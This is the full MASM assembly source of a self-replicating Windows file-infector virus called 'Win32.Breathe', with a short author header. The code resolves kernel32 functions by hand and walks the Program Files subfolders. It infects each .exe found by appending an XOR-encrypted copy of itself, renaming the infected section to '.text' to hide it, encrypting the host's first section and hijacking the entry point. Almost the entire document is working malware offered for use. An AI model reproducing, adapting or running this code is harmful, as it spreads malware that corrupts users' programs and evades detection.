COMMENT &

Win32.Breathe v0.8c

Author   : Kharn
Year     : 2006
Platform : Windows (XP tested)
Targets  : C:\Program Files\*\*.exe
Compile  : MASM + PEWRSec

Notes:

Not really that complex. Infects files. No payload, and tries to hide itself
by renaming it's section + encryption. Encrypts the host's first section as
well.

<3, Kharn.

&

__RELEASE__ equ 0

.486
.model flat,stdcall
option casemap :none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc

includelib \masm32\lib\kernel32.lib

VIRUS_SIZE equ end_virus - start_virus

VIRUS_BODYSIZE equ end_virus - virus_body
VIRUS_DECRSIZE equ virus_body - start_virus

InfectFile PROTO
FirstRecurse PROTO
ExeRecurse PROTO

.data
dummy dd 0

.code

start_virus:

call GetDelta

GetDelta:

pop ebp
sub ebp,offset GetDelta

@@:
lea esi, [ebp + offset virus_body]
lea edi, [ebp + offset virus_body]
mov ecx, VIRUS_BODYSIZE
mov bl,[ebp + xor_key]

@@:
.if ecx == 0
jmp @F
.endif
lodsb
xor al,bl
stosb
dec ecx
jmp @B
@@:
jmp @F

virus_body:

db "<3, Kharn"

@@:
mov esi, [ebp + firstSegtVOffs]
mov edi,esi
mov ecx, [ebp + firstSegtVSize]

@@:
.if ecx == 0
jmp @F
.endif
lodsb
xor al,bl
stosb
dec ecx
jmp @B
@@:
mov [ebp + xor_key],bl
mov eax,[esp]

and eax,0FFFFF000h

compare:
cmp word ptr [eax], 'ZM'
je kernel32_found
sub eax, 1000h
jmp compare

kernel32_found:

mov	[ebp + _Kernel32], eax
lea	esi, [ebp + __API_LoadLibrary]
call  GetFunctionAddress
mov [ebp + __ADDR_LoadLibrary],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_FindFirstFile]
call GetFunctionAddress
mov [ebp + __ADDR_FindFirstFile],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_SetCurrentDirectory]
call GetFunctionAddress
mov [ebp + __ADDR_SetCurrentDirectory],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_GetFileAttributes]
call GetFunctionAddress
mov [ebp + __ADDR_GetFileAttributes],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_FindNextFile]
call GetFunctionAddress
mov [ebp + __ADDR_FindNextFile],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_FindClose]
call GetFunctionAddress
mov [ebp + __ADDR_FindClose],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_CreateFile]
call GetFunctionAddress
mov dword ptr [ebp + __ADDR_CreateFile],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_lstrcpy]
call GetFunctionAddress
mov dword ptr [ebp + __ADDR_lstrcpy],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_GetFileSize]
call GetFunctionAddress
mov dword ptr [ebp + __ADDR_GetFileSize],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_CreateFileMapping]
call GetFunctionAddress
mov [ebp + __ADDR_CreateFileMapping],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_MapViewOfFile]
call GetFunctionAddress
mov [ebp + __ADDR_MapViewOfFile],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_ExitProcess]
call GetFunctionAddress
mov [ebp + __ADDR_ExitProcess],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_UnmapViewOfFile]
call GetFunctionAddress
mov [ebp + __ADDR_UnmapViewOfFile],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_CloseHandle]
call GetFunctionAddress
mov [ebp + __ADDR_CloseHandle],eax

jmp found_all

GetFunctionAddress:
	mov	ebx, [eax + 3Ch]					; Pointer to pe header
	add	ebx, eax
	add	ebx, 120
	mov	ebx, [ebx]
	add	ebx, eax						; EBX = Export Address
	xor	edx, edx
	mov	ecx, [ebx + 32]
	add	ecx, eax
	push	esi
	push	edx
 
CompareNext:
	pop	edx
	pop	esi
	inc	edx
	mov	edi, [ecx]
	add	edi, eax
	add	ecx, 4
	push	esi
	push	edx
 
CompareName:
	mov	dl, [edi]
	mov	dh, [esi]
	cmp	dl, dh
	jne	CompareNext
	inc	edi
	inc	esi
	cmp	byte ptr [esi], 0
	je	GetAddress
	jmp	CompareName
 
GetAddress:
	pop	edx
	pop	esi
	dec	edx
	shl	edx, 1
	mov	ecx, [ebx + 36]
	add	ecx, eax
	add	ecx, edx
	xor	edx, edx
	mov	dx, [ecx]
	shl	edx, 2
	mov	ecx, [ebx + 28]
	add	ecx, eax
	add	ecx, edx
	add	eax, [ecx]
 
	ret

found_all:

lea esi,[ebp + __STRING_RootInfect]
push esi
mov eax,[ebp + __ADDR_SetCurrentDirectory]
call eax

push ebp

call FirstRecurse

pop ebp

jmp end_virus

ExeRecurse PROC

lea eax,[ebp + OFFSET __STRUCT_Win32_FindExes]
push eax
lea eax,[ebp + OFFSET __STRING_Dot_Exe]
push eax
mov eax,[ebp + __ADDR_FindFirstFile]
call eax

mov [ebp + __HND_ExeFind],eax

.if eax == INVALID_HANDLE_VALUE
mov eax,-1
jmp finish_er
.endif

lea esi,[ebp + OFFSET __STRUCT_Win32_FindExes]
assume esi:ptr WIN32_FIND_DATA
lea eax,[esi].cFileName

mov esi,eax
lodsb

.if al == '.'
jmp @F
.endif

lea esi,[ebp + __STRUCT_Win32_FindExes]

assume esi:ptr WIN32_FIND_DATA
lea eax,[esi].cFileName
push eax
push eax
mov eax,[ebp + __ADDR_GetFileAttributes]
call eax

.if eax != FILE_ATTRIBUTE_DIRECTORY
pop eax
mov [ebp + __PTR_fileName],eax
call InfectFile
.else
pop eax
.endif

@@:
lea esi,[ebp + OFFSET __STRUCT_Win32_FindExes]
push esi
mov esi,[ebp + __HND_ExeFind]
push esi
mov eax,[ebp + __ADDR_FindNextFile]
call eax

.if eax == 0
jmp @F
.endif

lea esi,[ebp + OFFSET __STRUCT_Win32_FindExes]
assume esi:ptr WIN32_FIND_DATA
lea eax,[esi].cFileName

mov esi,eax
lodsb

.if al == '.'
jmp @B
.endif

lea esi,[ebp + __STRUCT_Win32_FindExes]

assume esi:ptr WIN32_FIND_DATA
lea eax,[esi].cFileName
push eax
push eax
mov eax,[ebp + __ADDR_GetFileAttributes]
call eax

.if eax != FILE_ATTRIBUTE_DIRECTORY
pop eax
mov [ebp + __PTR_fileName],eax
call InfectFile
.else
pop eax
.endif

jmp @B

@@:

finish_er:
ret
ExeRecurse ENDP

FirstRecurse PROC

lea esi,[ebp + OFFSET __STRUCT_Win32_FindData]
push esi
lea esi,[ebp + OFFSET __STRING_Dot_Star]
push esi
mov eax,[ebp + __ADDR_FindFirstFile]
call eax
mov [ebp + __HND_FirstFind],eax

.if eax == INVALID_HANDLE_VALUE
mov eax,-1
jmp finish_fr
.endif

lea esi,[ebp + OFFSET __STRUCT_Win32_FindData]
assume esi:ptr WIN32_FIND_DATA
lea eax,[esi].cFileName

mov esi,eax
lodsb

.if al == '.'
jmp @F
.endif

lea esi,[ebp + OFFSET __STRUCT_Win32_FindData]
assume esi:ptr WIN32_FIND_DATA
lea eax,[esi].cFileName
push eax
mov eax,[ebp + __ADDR_GetFileAttributes]
call eax

.if eax == FILE_ATTRIBUTE_DIRECTORY
lea esi,[ebp + OFFSET __STRUCT_Win32_FindData]
assume esi:ptr WIN32_FIND_DATA
lea eax,[esi].cFileName
push eax
mov eax,[ebp + __ADDR_SetCurrentDirectory]
call eax
call ExeRecurse
lea eax,[ebp + __STRING_Dot_Dot]
push eax
mov eax,[ebp + __ADDR_SetCurrentDirectory]
call eax
.endif

@@:
lea esi,[ebp + OFFSET __STRUCT_Win32_FindData]
push esi
mov eax,[ebp+__HND_FirstFind]
push eax
mov eax,[ebp + __ADDR_FindNextFile]
call eax

.if eax == 0
jmp @F
.endif

lea esi,[ebp + OFFSET __STRUCT_Win32_FindData]
assume esi:ptr WIN32_FIND_DATA
lea eax,[esi].cFileName

mov esi,eax
lodsb

.if al == '.'
jmp @B
.endif

lea esi,[ebp + OFFSET __STRUCT_Win32_FindData]
assume esi:ptr WIN32_FIND_DATA
lea eax,[esi].cFileName
push eax
mov eax,[ebp + __ADDR_GetFileAttributes]
call eax

.if eax == FILE_ATTRIBUTE_DIRECTORY
lea esi,[ebp + OFFSET __STRUCT_Win32_FindData]
assume esi:ptr WIN32_FIND_DATA
lea eax,[esi].cFileName
push eax
mov eax,[ebp + __ADDR_SetCurrentDirectory]
call eax
call ExeRecurse
lea eax,[ebp + __STRING_Dot_Dot]
push eax
mov eax,[ebp + __ADDR_SetCurrentDirectory]
call eax
.endif

jmp @B

@@:
finish_fr:
ret
FirstRecurse ENDP

InfectFile PROC
push NULL
push FILE_ATTRIBUTE_NORMAL
push OPEN_ALWAYS
push NULL
push FILE_SHARE_READ or FILE_SHARE_WRITE
push GENERIC_WRITE or GENERIC_READ
mov eax,[ebp + __PTR_fileName]
push eax
mov eax,[ebp + __ADDR_CreateFile]
call eax
mov [ebp + __HND_File],eax

push NULL
push eax
mov eax,[ebp + __ADDR_GetFileSize]
call eax
add eax,VIRUS_SIZE
add eax,1000h
mov [ebp + __max_size],eax

push 0
mov eax,[ebp + __max_size]
push eax
push 0
push PAGE_READWRITE
push NULL
mov eax,[ebp + __HND_File]
push eax
mov eax,[ebp + __ADDR_CreateFileMapping]
call eax
mov [ebp + __MAP_File],eax

push dword ptr [ebp + offset __max_size]
push 0
push 0
push FILE_MAP_WRITE
mov eax,[ebp  + __MAP_File]
push eax
mov eax,[ebp + __ADDR_MapViewOfFile]
call eax
mov [ebp + __PTR_File],eax

mov edi,eax
xor eax,eax
assume edi:ptr IMAGE_DOS_HEADER
mov ax,[edi].e_magic

add edi,[edi].e_lfanew

assume edi:ptr IMAGE_NT_HEADERS
add edi,SIZEOF DWORD
assume edi:ptr IMAGE_FILE_HEADER
xor ecx,ecx
mov cx,[edi].NumberOfSections
mov [ebp + totalSec],ecx

add edi,SIZEOF IMAGE_FILE_HEADER
mov [ebp + ptrEP],edi
assume edi:ptr IMAGE_OPTIONAL_HEADER32
mov eax,[edi].ImageBase
mov [ebp + firstSegtVOffs],eax
add eax,[edi].AddressOfEntryPoint
mov [ebp + oldEP],eax

mov eax,[edi].FileAlignment
mov [ebp + fileAlign],eax

add edi,SIZEOF IMAGE_OPTIONAL_HEADER32

assume edi:ptr IMAGE_SECTION_HEADER

; while reading section table:
;    - EDI holds Current Section Header Pointer
;    - ESI holds Highest RawData Pointer
;    - EAX holds ESI's "parent" segment header pointer

xor esi,esi
@@:
.if ecx == 0
jmp @F
.endif

; encrypt the first section.

.if esi == 0
mov eax,[edi].PointerToRawData
mov [ebp + firstSegtOffset],eax
mov eax,[edi].VirtualAddress
add [ebp + firstSegtVOffs],eax
mov eax,[edi].Misc.VirtualSize
mov [ebp + firstSegtVSize],eax
mov al,byte ptr [edi].Name1
mov [ebp + firstSegtKey],al

mov eax,[edi].Characteristics
or eax,0A0000020h
mov [edi].Characteristics,eax

.endif

.if [edi].PointerToRawData > esi
mov esi,[edi].PointerToRawData
mov eax,edi
.endif
add edi,SIZEOF IMAGE_SECTION_HEADER
dec ecx
jmp @B

@@:
mov edi,eax

assume edi:ptr IMAGE_SECTION_HEADER

mov ebx,[edi].Misc.VirtualSize
add ebx,VIRUS_SIZE
add ebx,7
mov [edi].Misc.VirtualSize,ebx

push edi
lea eax,[edi].Name1
mov edi,eax

mov al,'.'             ; we're in the text section now :D
stosb
mov al,'t'
stosb
mov al,'e'
stosb
mov al,'x'
stosb
mov al,'t'
stosb
mov al,0
stosb

pop edi

xor edx,edx
mov eax,ebx
mov ebx,[ebp + fileAlign]
div ebx

.if edx == 0
mov eax,[edi].Misc.VirtualSize
jmp dont_round
.endif

mov eax,[edi].Misc.VirtualSize
mov ebx,[ebp + fileAlign]
push ebx

xor ecx,ecx
mov edx,eax     ; round to the nearest file alignment.

@@:
inc ecx
shr ebx,1
.if ebx == 0
dec ecx
jmp @F
.endif
jmp @B

@@:
sar eax,cl
sal eax,cl
pop ebx
add eax,ebx

dont_round:
mov ebx,[edi].SizeOfRawData
mov [edi].SizeOfRawData,eax
sub eax,ebx
shr eax,12
shl eax,12

mov [ebp + deltaImage],eax

mov eax,[edi].Characteristics
or eax,0A0000020h
mov [edi].Characteristics,eax

mov esi,[edi].VirtualAddress
add esi,[edi].Misc.VirtualSize
sub esi,VIRUS_SIZE
sub esi,7

push esi                                  ; new EntryPoint

mov esi,[edi].PointerToRawData
add esi,[edi].Misc.VirtualSize
sub esi,VIRUS_SIZE
sub esi,7

mov edi,esi
add edi,[ebp + __PTR_File]

lea esi, [ebp + offset start_virus]       ; copy the decryptor
mov ecx, VIRUS_DECRSIZE
rep movsb

lea esi, [ebp + offset virus_body]
mov ecx, VIRUS_BODYSIZE
mov bl,[ebp + xor_key]

; simple key changing

inc bl

; xor 0,bl = bl, so the new key is "xored" to the infected child binary.

xor al,al
mov [ebp + xor_key],al

@@:
.if ecx == 0
jmp @F
.endif
lodsb
xor al,bl
stosb
dec ecx
jmp @B 
@@:

push edi

; encrypt the host

mov esi, [ebp + firstSegtOffset]
add esi, [ebp + __PTR_File]
mov edi,esi
mov ecx, [ebp + firstSegtVSize]

@@:
.if ecx == 0
jmp @F
.endif
lodsb
xor al,bl
stosb
dec ecx
jmp @B 
@@:

pop edi

mov al,0b8h
stosb

mov eax,[ebp + oldEP]
stosd

mov ax,0d0ffh
stosw

mov edi,[ebp + ptrEP]
assume edi:ptr IMAGE_OPTIONAL_HEADER32
pop eax
mov [edi].AddressOfEntryPoint,eax
pop eax

mov ebx,[edi].SizeOfImage
mov eax,[ebp + deltaImage]
add ebx,eax
mov [edi].SizeOfImage,ebx

; clean up.

mov eax,[ebp + __PTR_File]
push eax
mov eax,[ebp + __ADDR_UnmapViewOfFile]
call eax

mov eax,[ebp + __MAP_File]
push eax
mov eax,[ebp + __ADDR_CloseHandle]
call eax

mov eax,[ebp + __HND_File]
push eax
mov eax,[ebp + __ADDR_CloseHandle]
call eax

ret
InfectFile ENDP

jmp end_virus

xor_key db 0

firstSegtOffset dd 0
firstSegtVSize dd 0
firstSegtVOffs dd 0
firstSegtKey db 0

__API_LoadLibrary db "LoadLibrary",0
__ADDR_LoadLibrary dd 0

__API_CreateFile db "CreateFile",0
__ADDR_CreateFile dd 0

__API_CreateFileMapping db "CreateFileMapping",0
__ADDR_CreateFileMapping dd 0

__API_MapViewOfFile db "MapViewOfFile",0
__ADDR_MapViewOfFile dd 0

__API_SetCurrentDirectory db "SetCurrentDirectory",0
__ADDR_SetCurrentDirectory dd 0

__API_ExitProcess db "ExitProcess",0
__ADDR_ExitProcess dd 0

__API_MessageBox db "MessageBox",0
__ADDR_MessageBox dd 0

__API_UnmapViewOfFile db "UnmapViewOfFile",0
__ADDR_UnmapViewOfFile dd 0

__API_CloseHandle db "CloseHandle",0
__ADDR_CloseHandle dd 0

__API_GetFileSize db "GetFileSize",0
__ADDR_GetFileSize dd 0

__API_FindFirstFile db "FindFirstFile",0
__ADDR_FindFirstFile dd 0

__API_GetFileAttributes db "GetFileAttributes",0
__ADDR_GetFileAttributes dd 0

__API_FindNextFile db "FindNextFile",0
__ADDR_FindNextFile dd 0

__API_FindClose db "FindClose",0
__ADDR_FindClose dd 0

__API_lstrcpy db "lstrcpy",0
__ADDR_lstrcpy dd 0

__DLL_User32 db "user32",0

__STRING_FileName db "petest.exe",0
__STRING_newdir db MAX_PATH dup(0)
__STRING_dotdot db "..",0
__STRING_filemask db "*.*",0

__HND_File dd 0
__HND_FirstFind dd 0
__HND_ExeFind dd 0
__MAP_File dd 0
__PTR_File dd 0

_User32 dd 0
_Kernel32 dd 0

totalSec dd 0
ptrEP dd 0
oldEP dd 0
oldLast dd 0
secNum dd 0

fileAlign dd 0
deltaImage dd 0

oldrawsize dd 0

__STRUCT_Win32_FindData WIN32_FIND_DATA <>
__STRUCT_Win32_FindExes WIN32_FIND_DATA <>
__STRING_Dot_Star db "*.*",0


.IF __RELEASE__
__STRING_RootInfect db "C:\Program Files\",0
.ELSE
__STRING_RootInfect db "danger",0
.ENDIF

__STRING_Dot_Exe db "*.exe",0
__STRING_Dot_Dot db "..",0

__PTR_fileName dd 0

__max_size dd 0

end_virus:

ret
end start_virus